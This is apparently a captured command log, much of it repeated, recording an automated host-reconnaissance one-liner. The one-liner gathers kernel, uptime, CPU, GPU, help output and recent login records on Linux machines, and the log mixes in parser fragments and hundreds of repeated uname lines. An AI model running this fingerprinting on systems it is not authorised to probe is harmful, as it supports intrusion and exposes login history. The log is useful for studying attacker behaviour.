(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname -a
uname -a
uname -s -m
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
uname -s -v -n -r
hostname
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
